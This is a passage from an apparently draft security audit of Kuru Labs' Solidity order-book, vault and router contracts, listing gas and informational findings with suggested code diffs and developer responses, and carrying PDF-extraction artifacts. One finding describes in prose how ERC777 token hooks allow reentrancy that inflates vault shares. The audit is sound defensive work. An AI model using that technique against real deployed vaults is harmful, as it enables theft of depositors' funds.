while \(\_sizeToBeFilledLeft > 0 && \_bestBid >= \_limitPrice && \_bestBid \!= type\(uint256\).max\) \{

\+

while \(\_sizeToBeFilledLeft > 0 && \_bestBid >= \_limitPrice && \_bestBid \!= 0\) \{

uint96 \_sizeToBeFilledBefore = \_sizeToBeFilledLeft; //save size left to fill

bytes memory priceUpdate; 

@@ -1268,7 \+1274,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A

\}return \(false, firstLeft \* vaultPricePrecision / pricePrecision\); 

\}

-

return \(vaultBestAsk \!= type\(uint256\).max\) ? \(true, vaultBestAsk\) : \(false, 0\); 

36

\+

return \(vaultBestAsk \!= type\(uint256\).max\) ? \(true, vaultBestAsk\) : \(false, 

,\! 

type\(uint256\).max\); 

\}

function bestBid\(\) internal view returns \(bool, uint256\) \{

@@ -1283,7 \+1289,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A

\}return \(false, firstRight \* vaultPricePrecision / pricePrecision\); 

\}

-

return vaultBestBid \!= 0 ? \(true, vaultBestBid\) : \(false, type\(uint256\).max\); 

\+

return vaultBestBid \!= 0 ? \(true, vaultBestBid\) : \(false, 0\); 

\}

/\*\*

**Kuru Labs: **Acknowledged, but will be sticking with current implementation for now. 

**Spearbit: **Acknowledged. 

**5.5.8**

**No need to inherit **Ownable **for **OrderBook **and **KuruAMMVault **contracts** **Severity: **Gas Optimization

**Context: **KuruAMMVault.sol\#L18, OrderBook.sol\#L21

**Description: **There is no actual need to inherit Ownable contract for OrderBook & KuruAMMVault contracts. Ownership of these contracts is given to Router contract during market creation. Further, the features provided by Ownable \(single/two-step ownership transfer, renouncing, etc\) are never utilized in the context of OrderBook & KuruAMMVault contracts. 

Instead a simple router state parameter can be used to restrict the toggleMarkets and upgradeToAndCall calls. 

This change will reduce the deployment cost as code size will get reduced, it will also decrease the user transaction cost as the number of functions exposed by contract will get reduced. 

**Recommendation: **A simple router state parameter can be added to restrict the toggleMarkets and upgradeToAndCall calls. 

**Kuru Labs: **Fixed in commit 651c287d. 

**Spearbit: **Fix verified. 

**5.5.9**

KuruForwarder**: **DRAFT

ECDSA.recoverCalldata **can be used instead of **ECDSA.recover

**Severity: **Gas Optimization

**Context: **KuruForwarder.sol\#L106, KuruForwarder.sol\#L130, KuruForwarder.sol\#L144, KuruForwarder.sol\#L168

**Description: **In the verify\* functions of KuruForwarder the signature parameter is marked as calldata but ECDSA.recover function is used to verify the signature. Using ECDSA.recover\(\) will cause the compiler to copy the signature into memory. Instead ECDSA.recoverCalldata\(\) should be used which will operate directly on the calldata, skipping the extra memory operations. 

**Recommendation: **Replace ECDSA.recover with ECDSA.recoverCalldata. 

**Kuru Labs: **Fixed in commit 231262b1. 

**Spearbit: **Fix verified. 

**5.5.10**

**Returned value of **\_msgSender\(\) **function can be cached to save gas**

**Severity: **Gas Optimization

**Context: **MarginAccount.sol\#L213-L222

37

**Description: **Calling \_msgSender\(\) is a slightly expensive operation. Instead of calling it multiple times in a single function, its value can be cached in memory to save gas. 

Instances present in:

• MarginAccount.sol. 

• OrderBook.sol. 

**Recommendation: **Consider caching result of \_msgSender in a memory parameter. 

**Kuru Labs: **Acknowledged. 

**Spearbit: **Acknowledged. 

**5.5.11**

**Store Precisions Instead of Decimals for Base and Quote Assets**

**Severity: **Gas Optimization

**Context: **OrderBook.sol\#L42-L43

**Description: **The OrderBook contract stores the baseAssetDecimals and quoteAssetDecimals fields in order to do precision conversions. When used, either in OrderBook or AbstractAmm, these fields are always used as exponents to compute precision \(10 \*\* decimals\). 

**Recommendation: **Store the asset precisions \(10 \*\* decimals\) instead of decimals to reduce gas usage and decrease bytecode size, as well as improve readability. The \_getBaseAssetDecimals\(\) and \_getQuoteAssetDecimals\(\) functions can be replaced with functions that return the precisions. 

**Kuru Labs: **Fixed in commit 20243b36. 

**Spearbit: **Only partially fixed: AbstractAMM.sol is still exponentiating every time it needs an asset precision multiplier. This could be addressed by adding virtual functions to AbstractAMM that return precisions instead of decimals and overriding them in OrderBook \(similar to how the functions for the asset decimals work now\). 

**5.6**

**Informational**

**5.6.1**

**Better Function / Variable / Contract / File Naming**

**Severity: **Informational

**Context:**

AbstractAMM.sol\#L79-L91, 

KuruAMMVault.sol\#L155, 

KuruForwarder.sol\#L57, 

MarginAc-

count.sol\#L109, 

MarginAccount.sol\#L176-L185, 

OrderBook.sol\#L111, 

OrderBook.sol\#L130, 

OrderBook.sol\#L152, 

DRAFT

OrderBook.sol\#L336, 

OrderBook.sol\#L394-L396, 

OrderBook.sol\#L1033-L1037, 

OrderBook.sol\#L1149-L1157, OrderBook.sol\#L1170-L1177, ERC20.sol\#L6, ERC20.sol\#L7, KuruUtils.sol\#L19, 

MonadDeployer.sol\#L11, 

Router.sol\#L43, 

Router.sol\#L78, 

Router.sol\#L230-L234, 

Router.sol\#L421, 

MonadDeployer.t.sol\#L47

**Description/Recommendation:**

• KuruUtils.sol\#19: price is set 10 \*\* 18, which is also used as a standalone magic number. It does not make much sense to initialize price to 10 \*\* 18 only to overwrite it later using the magic number as the actual value we need to calculate price. Consider initializing price to zero and have another variable for 10 \*\* 18. Another option would be to replace 10 \*\* 18 by price, but this alternative wouldn't not be very readable. 

• MarginAccount.sol\#L176-185: The function name batchClaimMaxTokens\(\) is confusing as claiming is usually associated with rewards and implies a different meaning from **withdrawing**. Consider renaming to batchWithdrawMaxTokens\(\). 

• KuruAMMVault.sol\#L155: A more technically accurate name would be \_mintAndDeposit\(\), following the same logic as \_burnAndWithdraw\(\), which takes into account the order the operations occur in. 

• KuruForwarder.sol\#L57: Rename \_TYPEHASH to \_FORWARD\_TYPEHASH for consistency with other typehashes defined and clarity. 

38

• Router.sol\#L230-234, OrderBook.sol\#L152: Rename these functions to:

**– **Router.toggleMarket \! Router.toggleMarkets. 

**– **OrderBook.toggleMarkets \! OrderBook.toggleMarket. 

• ERC20.sol\#L7: Calling the last parameter owner is a bit misleading, this contract has no owner. A better name would be something like mintRecipient that is descriptive of the actual purpose of the parameter:

- address owner

\+ address mintRecipient

• The magic number 10 \*\* 18 is used 3 times in KuruAMMVault and 4 times in the OrderBook. Replace them with the already defined vaultPricePrecision:

- 10 \*\* 18

\+ vaultPricePrecision

• OrderBook.sol\#L111, OrderBook.sol\#L130, Router.sol\#L421, AbstractAMM.sol\#L79-91: \_kuruAmmSpread is defined in basis points, but the scale used in the AbstractAMM is a magnitude of 10 less, and so \_kuruAmmSpread is divided by 10 as the initialisation value. It would be simpler to leave \_kuruAmmSpread in basis points, then modify the denominators 1000 / 2000 to 10\_000 \(== BPS\_MULTIPLIER or name it differently, BPS\_DENOMINATOR\) & 20\_000 \(maybe name it DOUBLE\_BPS\_DENOMINATOR\) respectively. Keeping everything in basis points is simpler and less of a mental load. 

• OrderBook.sol\#L394-L396: Technically the parameter name \_makerAddress is a misnomer, since consumed funds are not from the order being made by the user alone, but for the orders being taken by the user as well. 

Consider changing the parameter name simply to \_userAddress to avoid confusion. 

• OrderBook.sol\#L1170-L1177: The name \_amountPayable\(\) is vague and does not explicitly define that this function returns the amount payable in quote assets. Additionally, \_amountPayable\(\) and \_calculateFundsConsumed\(\) are "equivalent", except rounding in different directions, in a way being mirror functions of each other. Consider refactoring:

**– **\_amountPayable\(\) \! \_quoteAmountRoundedDown\(\). 

**– **\_calculateFundsConsumed\(\) \! \_quoteAmountRoundedUp\(\). 

**– **The natspec of \_amountPayable\(\): \* @param \_price conversion price from A to B -> \* @param \_price conversion price from base to quote . 

• OrderBook.sol\#L336: \_addFlipOrder\(\) and \_addFlippedOrder\(\) have identical implementations to \_addOrder\(\), with the only difference being the event emissions and three inputs: \_flippedPrice, \_flippedId and \_owner. 

DRAFT

Merging \_addFlipOrder\(\) and \_addFlippedOrder\(\) into \_addOrder\(\) would improve code

clarity, and reduce deployment gas costs. 

Consider removing \_addFlipOrder\(\) and \_addFlippedOrder\(\) and only using \_addOrder\(\) for simplicity. 

\_addOrder\(\) could be refactored to include the extra inputs and one extra tag to determine what event should be emitted \(FlipOrderCreated, FlippedOrderCreated or OrderCreated\). 

• OrderBook.sol\#L1033-L1037: Multiple variables named as some variation of "someSize" in \_fillOrder\(\) makes it difficult to track the meaning of each variable. Consider renaming "size" variables to be more descriptive, for example:

**– **\_sizeToBeFilled \! \_incomingSizeToBeFilled. 

**– **remainingSize \! incomingOrderRemainingSize. 

**– **\_updatedSize \! \_preExistingOrderUpdatedSize. 

**– **\_orderSize \! \_preExistingOrderSize. 

• OrderBook.sol\#L1149-L1157: The \_creditMaker\(\) function is under the context of crediting the maker of the order. Every input parameter is about the maker order, it makes little sense to only treat \_isMarketBuy 39

differently. The \_isMarketBuy input also references the maker order. The natspec says \* @param \_isMarketBuy Whether the order is a market buy., making the reader assume it's the maker order, because everything else in this function is under this context. \_isMarketBuy seems to be going in the opposite direction here and not crediting the maker in the asset that it should. In creditAsset we would expect the maker to be getting base assets if \_isMarketBuy == true, but the opposite is happening. Same for calculating the amount. Operationally speaking, this works because the \_creditMaker\(\) function gets called with \_isMarketBuy == \!s\_orders\[\_orderId\].isBuy. Where as \_isMarketBuy == s\_orders\[\_orderId\].isBuy should be the right way to semantically populate this input. We recommend aligning \_isMarketBuy semantics so when s\_orders\[\_orderId\].isBuy is true we are crediting base assets to the maker, as they are buying base assets. In \_fillOrder\(\):

if \(s\_orders\[\_orderId\].flippedPrice == 0\) \{

\_orderUpdate = \_creditMaker\(

-

\!s\_orders\[\_orderId\].isBuy, 

\+

s\_orders\[\_orderId\].isBuy, 

In \_creditMaker\(\):

- address creditAsset = \_isMarketBuy ? quoteAsset : baseAsset; 

\+ address creditAsset = \_isMarketBuy ? baseAsset : quoteAsset; 

- uint256 amount = \_isMarketBuy ? \_amountPayable\(\_size, \_price\) : \(\(\_size \* 10 \*\*

,\! 

baseAssetDecimals\) / sizePrecision\); 

\+ uint256 amount = \_isMarketBuy ? \(\(\_size \* 10 \*\* baseAssetDecimals\) / sizePrecision\) :

,\! 

\_amountPayable\(\_size, \_price\)\); 

- if \(\_isMarketBuy\) \{

\+ if \(\!\_isMarketBuy\) \{

• MonadDeployer.t.sol\#L47: The use of magic numbers makes the deployment process less secure as it is easier to use accidentally use the wrong parameters. Consider refactoring the input parameters to use named parameters instead to make it more readable and avoid configuration mistakes on deployments. 

MonadDeployer.MarketParams memory marketParams = MonadDeployer.MarketParams\(\{

nativeTokenAmount: 100 \* 10 \*\* 18, // 100 native tokens

sizePrecision: 10 \*\* 10, 

// 10^10 for size precision

pricePrecision: 10 \*\* 2, 

// 10^2 for price precision

tickSize: 10, 

// 10 tick size

minSize: 10 \*\* 2, 

// 10^2 minimum size

maxSize:

DRAFT

10 \*\* 10, 

// 10^10 maximum size

takerFeeBps: 10, 

// 10 basis points taker fee

makerFeeBps: 5

// 5 basis points maker fee

\}\); 

• MonadDeploy.sol\#L11: There is nothing specific to Monad about this contract, despite being named MonadDeployer. It could be given a more generic name. 

• Router.sol\#L43-L43: Rename parameter \_implementation to \_orderBookImplementation. 

• Router.sol\#L78-L78: Missing natspec for \_kuruAmmSpread parameter. 

• MarginAccount.sol\#L109-L109: Missing natspec for \_useMargin parameter. 

• ERC20.sol: it would be clearer if the name of this file were changed to KuruERC20.sol to match the name of the contract defined within it. 

**Kuru Labs: **Most of these recommendations have been implemented in commit ff557f9a. 

**Spearbit: **Fix verified. As these are minor/cosmetic improvements not fixing all of them will not have significant impact in the security of the protocol. 

40

**5.6.2**

**Improve **creditUsersEncoded\(\) **readability**

**Severity: **Informational

**Context: **MarginAccount.sol\#L139-L148

**Description: **creditUsersEncoded\(\) function uses the same transfer logic as creditUser\(\), however it is implemented in reverse when it comes to if \(\_token \!= NATIVE\) vs if \(\_token == NATIVE\) . 

**Recommendation: **Consider replacing the logic L139-L148 by the same logic used in creditUser\(\) L112-L121

as it is more readable. Replace:

if \(\_useMargin\) \{

balances\[\_accountKey\(\_user, \_token\)\] \+= \_amount; 

\} else \{

if \(\_token \!= NATIVE\) \{

\_token.safeTransfer\(\_user, \_amount\); 

\} else \{

\(bool success,\) = \_user.call\{value: \_amount\}\(""\); 

require\(success, MarginAccountErrors.NativeAssetTransferFail\(\)\); 

\}

\}

With:

if \(\_useMargin\) \{

balances\[\_accountKey\(\_user, \_token\)\] \+= \_amount; 

\} else \{

if \(\_token == NATIVE\) \{

\(bool success,\) = \_user.call\{value: \_amount\}\(""\); 

require\(success, MarginAccountErrors.NativeAssetTransferFail\(\)\); 

\} else \{

\_token.safeTransfer\(\_user, \_amount\); 

\}

\}

**Kuru Labs: **Fixed in commit 169d476e. 

**Spearbit: **Fix verified. 

**5.6.3**

**Missing documentation on critical storage altering function**

**Severity: **Informational

**Context: **Abstr

DRAFT

actAMM.sol\#L252

**Description: **This function is responsible for updating crucial storage variables vaultBestAsk and vaultBestBid, however it is missing natspec documentation. 

**Recommendation: **We recommend updating the natspec to explain the importance and functionality of this function \(change the ask and bid order sizes the vault is ready to replace\) and when it is called \(when someone deposits or withdraws out of the vault\). 

**Kuru Labs: **Fixed in commit 98eb5913. 

**Spearbit: **Fix verified. 

**5.6.4**

**ERC777 reentrancy could drain isolated market**

**Severity: **Medium Risk

**Context: **KuruAMMVault.sol\#L198-L199

41

**Summary: **The KuruAMMVault contract is vulnerable to reentrancy attacks when interacting with ERC777 tokens. 

The vulnerability occurs in the \_depositAndMint\(\) function where token transfers happen after share minting and state updates, potentially allowing an attacker to drain the vault through recursive calls. 

**Description: **ERC777 tokens include hooks that execute callbacks during transfers, which can be exploited to reenter the contract. 

This would allow the attacker to inflate his shares by avoiding the increase of the denominator \(reserves\) in the \_convertToShares\(\) calculation, while increasing the multiplier \(totalSupply\) in the numerator. He could loop this reentrancy to exacerbate the shares inflation effect. 

Assume even token ratios for simplicity:

• Amount1 and amount2 deposit = 100 each. 

• TotalSupply = 1000. 

• Reserves1 and reserve2 = 500 each. 

Scenario 1 \(no reentrancy\):

• Shares = \(100 x 1000\) / 500 = 200 shares. 

• On withdraw this would result in:

**– **Assets = \(200 x 600\) / 1200 = 100. 

Scenario 2 \(reentrancy, where every loop increases share inflation\): if we assume 10 atomic loops: by dividing the 100 we have 10 for amount1 and amount2 per loop. Once all loops finish this would equate to roughly 623 shares. 

So by calling withdraw after the loops have conclude the attacker would get:

assets = \(623 x 600\) / 1623 = 230. More than double the expected assets for the same amount of token deposits as scenario 1. Due to the permissionless nature of market deployment, it is important to account for such cases, despite ERC777 not being a common token. 

**Recommendation: **Consider implementing a reentrancy guard on the deposit\(\) function. 

**Kuru Labs: **Acknowledged. Will not be fixing as we do not plan on supporting ERC777 as of now. 

**Spearbit: **Acknowledged. 

**5.6.5**

**Typography mistakes**

**Severity: **Informational

**Context:**

DRAFT

OrderBook.sol\#L642

**Description/Recommendation:**

• \* @param \_isFillOrKill bool representing if function should revert if full qty is not

recieved. \(OrderBook.sol\#L642\). 

• "recieved" \! "received". 

• // Add price to the tree and update DLL of price poit. \(OrderBook.sol\#L184\). 

• "poit" \! "point". 

**Kuru Labs: **Fixed in commit dc2569ce. 

**Spearbit: **Fix verified. 

**5.6.6**

**Expand documentation to include nuanced behavior expectations**

**Severity: **Informational

**Context: **\(No context files were provided by the reviewer\)

42

**Description: **Non-obvious intentional behavior of the codebase should be explicitly covered in the documentation. 

For example:

• It is impossible to cancel only one of a flip order if both sides are active. 

• Flip orders are on an automatic loop by default and will never be credited to the maker unless the flip order is cancelled. 

• Flip orders do not pay maker fee rebates. 

**Recommendation: **Explicitly highlight in the documentation all nuanced expected behaviors that are intended under different scenarios. 

**Kuru Labs: **Fixed in commit 3bb63ee6. 

**Spearbit: **Fix verified. 

**5.6.7**

**Refactoring Recommendations for Readability**

**Severity: **Informational

**Context: **Router.sol\#L259-L264, Router.sol\#L298-L328, Router.sol\#L356-L367

**Description/Recommendation:**

• In the Router.anyToAnySwap\(\) function, the \_amountToSize\(\) function is invoked in two branches; \_amountToSize\(\) repeats the same branch condition internally and takes disjoint actions for each. Further, the action taken is a trivial ternary operation. Using the \_amountToSize\(\) function arguably makes the code less readable. Since these are the only callsites of \_amountToSize\(\), it would be cleaner to eliminate the function entirely and inline the appropriate ternary expressions directly in anyToAnySwap\(\). 

• In the Router.\_registerMarket\(\) function, ternary operators are used when if statements would be much cleaner:

- \_type == IOrderBook.OrderBookType.NATIVE\_IN\_BASE

-

? true

-

: IERC20\(\_baseAsset\).approve\(\_marketAddress, type\(uint256\).max\); 

- \_type == IOrderBook.OrderBookType.NATIVE\_IN\_QUOTE

-

? true

-

: IERC20\(\_quoteAsset\).approve\(\_marketAddress, type\(uint256\).max\); 

\+ if \(\_type \!= IOrderBook.OrderBookType.NATIVE\_IN\_BASE\) \{

\+

IERC20\(\_baseAsset\).approve\(\_marketAddress, type\(uint256\).max\); 

\+ \}

\+\+ if \(\_type \!= DRAFT

IOrderBook.OrderBookType.NATIVE\_IN\_QUOTE\) \{

\+

IERC20\(\_quoteAsset\).approve\(\_marketAddress, type\(uint256\).max\); 

\+ \}

**Kuru Labs: **Fixed in commits 6b54b77e and 0b7ec4f2. 

**Spearbit: **Fix verified. 

**5.6.8**

**Obsolete / Incorrect Comments**

**Severity: **Informational

**Context:**

BitMath.sol\#L12-L16, 

BitMath.sol\#L23, 

BitMath.sol\#L29-L33, 

MarginAccount.sol\#L20, 

MarginAccount.sol\#L25, Router.sol\#L25, Router.sol\#L269, Router.sol\#L289

**Description:**

• Obsolete Comments: The following comments were determined during the course of the review, based on feedback from the project team, to be obsolete:

**– **Router.sol\#L25. 

43

**– **Router.sol\#L269. 

**– **Router.sol\#L289. 

**– **MarginAccount.sol\#L20. 

**– **MarginAccount.sol\#L25. 

• Incorrect Comments:

**– **TreeMath.sol\#L114, TreeMath.sol\#L190: Only returns the ID if it's strictly lower / higher than. For equality cases, type\(uint32\).max / 0 is returned respectively. 

/// forge-config: default.fuzz.runs = 100000

function test\_fuzz\_findFirstLeftRight\(uint32 bit\) public \{

bit = uint32\(bound\(bit, 0, type\(uint32\).max - 1\)\); 

tree.add\(bit\); 

assertEq\(tree.findFirstLeft\(bit\), 0\); 

assertEq\(tree.findFirstRight\(bit\), type\(uint32\).max\); 

tree.add\(bit \+ 1\); 

assertEq\(tree.findFirstLeft\(bit\), bit \+ 1\); 

assertEq\(tree.findFirstLeft\(bit \+ 1\), 0\); 

assertEq\(tree.findFirstRight\(bit \+ 1\), bit\); 

assertEq\(tree.findFirstRight\(bit\), type\(uint32\).max\); 

\}

**– **Router.sol\#L64-L65: These lines reference a logically incoherent unit "bips per second", which should just be "basis points". 

**– **BitMath.sol\#L23: This comment should say "can't underflow" instead of "can't overflow" \(the only operation is a subtraction which by definition underflows, not overflows\). 

**– **BitMath.sol\#L12-L16 and BitMath.sol\#L29-L33: While not strictly incorrect, these comments do not fully specify the behavior of the functions they describe. In particular they fail to specify whether the search is inclusive of the bit parameter. 

**Recommendation: **Remove obsolete comments to prevent confusion; correct incorrect comments:

- \* @dev Returns the first id in the tree that is lower than or equal to the given id. 

\+ \* @dev Returns the first id in the tree that is strictly lower than the given id. 

- \* @dev Returns the first id in the tree that is higher than or equal to the given id. 

\+ \* @dev Returns the first id in the tree that is strictly higher than the given id. 

- \* @param

,\! 

\+ \* @param

DRAFT

\_takerFeeBps The taker fee in bips per second. 

\+ \* \* @param \_takerFeeBps The taker fee in basis points. 

- \* @param \_makerFeeBps The maker fee in bips per second. The maker fee must be lower than the taker fee. 

\_makerFeeBps The maker fee in basis points. The maker fee must be lower than the taker fee. 

- // can't overflow as it's non-zero and we shifted it by \`\_shift\`

\+ // can't underflow as it's non-zero and we shifted it by \`\_shift\`

**Kuru Labs: **Fixed. 

**Spearbit: **Fixed in the following commits:

• e38da446. 

• b9ce4e77. 

**5.6.9**

**Function Visibility**

**Severity: **Informational

**Context: **KuruUtils.sol\#L18

44

**Description: **All the functions in KuruUtils are public but are never called internally. 

**Recommendation: **Consider making functions in this contract external. 

**Kuru Labs: **Acknowledged. 

**Spearbit: **Acknowledged. 

**5.6.10**

**Import Organization**

**Severity: **Informational

**Context: **AbstractAMM.sol\#L14, KuruAMMVault.sol\#L11, OrderBook.sol\#L11, Router.sol\#L8, Router.sol\#L13

**Description: **The codebase organizes imports into sections. Many imports are improperly categorized:

• OrderBook.sol line 11: SafeTransferLib belongs in External Imports. 

• AbstractAmm.sol line 14: IMarginAccount belongs in Internal Interface Imports. 

• KuruAMMVault.sol line 11: SafeTransferLib belongs in External Imports. 

• Router.sol line 8: SafeTransferLib belongs in External Imports. 

• Router.sol line 13: IKuruAMMVault belongs under Internal Interface Imports. 

**Recommendation: **Move imports to the appropriate location. 

**Kuru Labs: **Fixed in commit 33cab590. 

**Spearbit: **Fix verified. 

**5.6.11**

**Unused Imports and Code**

**Severity: **Informational

**Context: **OrderLinkedList.sol\#L46, MarginAccount.sol\#L11, Router.sol\#L16

**Description: **The following imports are unused:

• Router.sol line 16: OwnableUpgradeable. 

• MarginAccount.sol line 11: IERC20. 

The following code is unused:

• OrderLinkedList.sol\#L46-L46: OrderLinkedList.updateTail. 

**Recommendation:**

DRAFT

Remove unused imports and code. 

**Kuru Labs: **Fixed in commits 8b38f5f6, 7a0ae43e and 33cab590. 

**Spearbit: **Fix verified. 

**5.6.12**

**Contract Field Visibility**

**Severity: **Informational

**Context: **AbstractAMM.sol\#L17, KuruAMMVault.sol\#L22-L30, Router.sol\#L32-L34

**Description: **\* Router.sol\#L32-34: orderBookImplementation, marginAccountAddress, and kuruAmmVaultImplementation lack a specified visibility. 

• KuruAMMVault.sol\#L22-30: The private variables here are never exposed; it would be a lot more convenient to do so, at least for token1 and token2 where it's possible to have different markets for the same pairing \(eg: ETH/USDC and USDC/ETH\). 

• AbstractAMM.sol\#L17-L26: List of issues in this layout:

**– **Missing explicit access specifiers \(public/private\). 

45

**– **Constants mixed with storage variables. 

**– **Missing storage packing. 

**Recommendation: **Add explicit visibilities for all contract fields. Consider which may be useful to expose on-chain. 

**Kuru Labs: **Fixed in commit 78887050. 

**Spearbit: **Fix verified. 

**5.6.13**

**Compiler Settings**

**Severity: **Informational

**Context: **foundry.toml\#L3, foundry.toml\#L5

**Description:**

• The evm\_version used is outdated and should be updated to cancun, as according to their documentation, Monad is fully compatible. 

• Consider setting an optimizer runs value \(a higher value optimizes for runtime gas costs; a lower value optimizes for bytecode size\). 

**Recommendation:**

- evm\_version = "shanghai" 

\+ evm\_version = "cancun" 

**Kuru Labs: **Fixed in commit 430a9e68. 

**Spearbit: **Fix verified. 

**5.6.14**

**Missing revert reason**

**Severity: **Informational

**Context: **OrderBook.sol\#L549-L551

**Description: **The referenced lines are missing the OrderBookErrors.LengthMismatch\(\) revert reason. 

**Recommendation:**

- require\(prices.length == flipPrices.length\); 

- require\(sizes.length == isBuy.length\); 

- require\(price

DRAFT

s.length == sizes.length\); 

\+ require\(prices.length == flipPrices.length, OrderBookErrors.LengthMismatch\(\)\); 

\+ require\(sizes.length == isBuy.length, OrderBookErrors.LengthMismatch\(\)\); 

\+ require\(prices.length == sizes.length, OrderBookErrors.LengthMismatch\(\)\); 

**Kuru Labs: **Fixed in commit 1fac2d8c. 

**Spearbit: **Fix verified. 

**5.6.15**

KuruForwarder**: boolean returned by execution functions can be omitted**

**Severity: **Informational

**Context: **KuruForwarder.sol\#L187-L191, KuruForwarder.sol\#L209-L213, KuruForwarder.sol\#L235-L239

**Description: **The execute\* functions of KuruForwarder revert when external call fails \(success == false\) and return true otherwise. There is no point in either returning true or reverting. 

**Recommendation: **Consider removing the boolean parameter from returned parameters of execute\* functions. 

**Kuru Labs: **Fixed in commit 30b5e3f0. 

46

**Spearbit: **Fix verified. 

**5.6.16**

SafeTransferLib.safeTransferETH **can be used to send native tokens**

**Severity: **Informational

**Context:**

KuruAMMVault.sol\#L184, 

KuruAMMVault.sol\#L356, 

MarginAccount.sol\#L116, 

MarginAc-

count.sol\#L145, MarginAccount.sol\#L216, OrderBook.sol\#L685, OrderBook.sol\#L735, OrderBook.sol\#L749, 

OrderBook.sol\#L753, Router.sol\#L337

**Description: **At multiple instances in protocol contracts the transfer of native token \(ETH\) is done using the call operation explicitly. 

\(bool \_success,\) = address\(recipient\).call\{value: value\}\(""\); 

require\(\_success, NativeAssetTransferFail\(\)\); 

Since the contracts already import and use SafeTransferLib for ERC20 token transfers, safeTransferETH can be used to perform native token transfer. 

**Recommendation: **Consider replacing explicit call operations with SafeTransferLib.safeTransferETH function call. 

**Kuru Labs: **Fixed in commit fff8d48f. 

**Spearbit: **Fix verified. 

**5.6.17**

**Missing event emission**

**Severity: **Informational

**Context: **MarginAccount.sol\#L84-L86, OrderBook.sol\#L152-L156, Router.sol\#L211-L223

**Description: **Events should be emitted to log crucial storage state updates in a contract. Currently the protocol contracts update the storage states without

DRAFT

emitting necessary events. 

MarginAccount.sol\#L84-L86: Emit event in updateMarkets. 

Router.sol\#L211-L223: Missing event emission on implementation change. 

OrderBook.sol\#L152-L156: Emit event when market is paused or unpaused. 

MarginAccount.sol\#L96-L168: Events should be emitted on every user debit and credit. 

**Recommendation: **Consider adding appropriate event emissions. 

**Kuru Labs: **Fixed. 

**Spearbit: **Partially fixed in PR 56. 

**5.6.18**

**Enforce a message length check when called via trusted forwarder**

**Severity: **Informational

**Context: **MarginAccount.sol\#L56-L64, OrderBook.sol\#L72-L80

**Description: **When a protocol contract is called via trusted forwarder, a minimum message length can be checked before reading the appended caller address from message. 

**Recommendation:**

47

function \_msgSender\(\) internal view virtual override returns \(address\) \{

uint256 calldataLength = msg.data.length; 

uint256 contextSuffixLength = \_contextSuffixLength\(\); 

-

if \(isTrustedForwarder\(msg.sender\) && calldataLength >= contextSuffixLength\) \{

\+

if \(isTrustedForwarder\(msg.sender\)\) \{

\+

require\(calldataLength >= contextSuffixLength, Error\(\)\); 

return address\(bytes20\(msg.data\[calldataLength - contextSuffixLength:\]\)\); 

\} else \{

return msg.sender; 

\}

\}

**Kuru Labs: **Acknowledged. 

**Spearbit: **Acknowledged. 

**5.6.19**

KuruERC20**: Use Solady's ERC20 instead of OpenZeppelin's ERC20 to support **permit **function** **Severity: **Informational

**Context: **ERC20.sol\#L4-L6

**Description/Recommendation: **Using ERC20 of Solady instead of OpenZeppelin will also provide the EIP2612

permit function. Since the protocol already use Solady's ERC20 for KuruAMMVault so same can be used for KuruERC20 for consistency. 

**Kuru Labs: **Fixed in commit 84719e03. 

**Spearbit: **Fix verified. 

**5.6.20**

MarginAccount.creditUsersEncoded **should validate the length of **\_encodedData **input** **Severity: **Informational

**Context: **MarginAccount.sol\#L130-L137

**Description: **As the creditUsersEncoded function decodes the input \_encodedData in chunks of 128 bytes. An explicit check can be added to validate that \_encodedData length is in multiple of 128. 

**Recommendation:**

\+ require\(\_encodedData.length % 128 == 0, InvalidData\(\)\); 

**Kuru Labs: **Ackno

DRAFT

wledged. 

**Spearbit: **Acknowledged. 

**5.6.21**

**The **\_msgSender **function can be implemented in **ERC2771Context **contract**

**Severity: **Informational

**Context: **ERC2771Context.sol\#L15, MarginAccount.sol\#L56-L64, OrderBook.sol\#L72-L80

**Description: **This \_msgSender function can be implemented in ERC2771Context contract directly. It already imple-ments \_msgData function with a similar logic. 

**Recommendation: **Consider removing the \_msgSender function from MarginAccount and OrderBook contracts, and implement it in ERC2771Context contract. 

**Kuru Labs: **Fixed in commit aa4f13b2. 

**Spearbit: **Fix verified. 

48

**5.6.22**

**Use Libraries for ERC20 Interfaces**

**Severity: **Informational

**Context: **IReadERC20.sol\#L4, IERC20.sol\#L8

**Description: **A custom IERC20 interface is defined in libraries/IERC20.sol. Not only is this interface misplaced \(the interfaces/ folder would be more appropriate\), it is also unnecessary as the OpenZeppelin libraries already in-use provide IERC20 and IERC20Metadata interfaces that can be used instead in all relevant contexts. Further, an IReadERC20 interface is defined in interfaces/IReadERC20.sol. This can also be replaced with OZ interfaces anywhere it is used. 

**Recommendation: **Use interface imports from libraries where feasible. Delete custom interfaces. 

**Kuru Labs: **Fixed in commit 7a0ae43e. Replaced with IERC20Metadata as advised. 

**Spearbit: **Fix verified. Commit b0772bb5 also contributed to the fix \(removed IReadERC20.sol\). 

**5.6.23**

**Incomplete and Inconsistent Natspec**

**Severity: **Informational

**Context: **OrderBook.sol\#L639-L644, Router.sol\#L78

**Description: **Natspec usage is inconsistent throughout the codebase--some functions are fully documented, some are partially documented, and some are not documented at all. 

Examples:

• Router.sol\#L78: the \_kuruAmmSpread parameter is missing from the natspec for deployProxy\(\). 

• Many functions in OrderBook.sol have incomplete or absent natspec. For example the natspec for placeAndExecuteMarketBuy\(\) fails to document minAmountOut, \_isMargin, and the return value. 

**Recommendation: **At least for functions exposed to external callers, ensure there is complete natspec describing the parameters, returns, and general purpose of DRAFT

the function, as well documenting as any important or subtle

considerations or behavioral details. It would also be helpful to document the intended precisions of all numerical parameters and return values. 

**Kuru Labs: **Fixed in commit 8bc70487. 

**Spearbit: **Fix verified. 

**5.6.24**

**Potentially Confusing Errors In Market Order Functions**

**Severity: **Informational

**Context: **OrderBook.sol\#L653-L658, OrderBook.sol\#L706-L711

**Description: **The OrderBook.placeAndExecuteMarketBuy\(\) function contains the following logic: if \(\_type == OrderBookType.NATIVE\_IN\_QUOTE && \!\_isMargin && \(msg.sender \!= address\(0\)\)\) \{

require\(

msg.value >= \_pricePrecisionToQuoteAssetPrecision\(\_quoteSize\)

&& msg.value < \_pricePrecisionToQuoteAssetPrecision\(\_quoteSize \+ 1\), 

OrderBookErrors.NativeAssetInsufficient\(\)

\); 

